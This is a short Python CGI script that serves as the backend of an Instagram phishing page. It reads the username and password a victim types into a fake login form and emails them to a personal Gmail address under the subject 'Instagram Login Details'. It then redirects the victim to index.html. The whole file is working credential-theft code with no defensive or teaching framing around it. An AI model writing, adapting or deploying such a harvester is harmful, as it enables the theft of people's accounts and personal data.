#!/usr/bin/env python3

import cgi
import smtplib

# Retrieve form data
form = cgi.FieldStorage()
username = form.getvalue('username')
password = form.getvalue('password')

# Email setup
sender_email = "maximzimba7@gmail.com"
receiver_email = "maximzimba7@gmail.com"
subject = "Instagram Login Details"
message = f"Username: {username}\nPassword: {password}"

# Send email
with smtplib.SMTP('localhost') as smtp:
    smtp.sendmail(sender_email, receiver_email, f'Subject: {subject}\n\n{message}')

# Redirect back to index.html or wherever you want
print("Location: index.html\n\n")
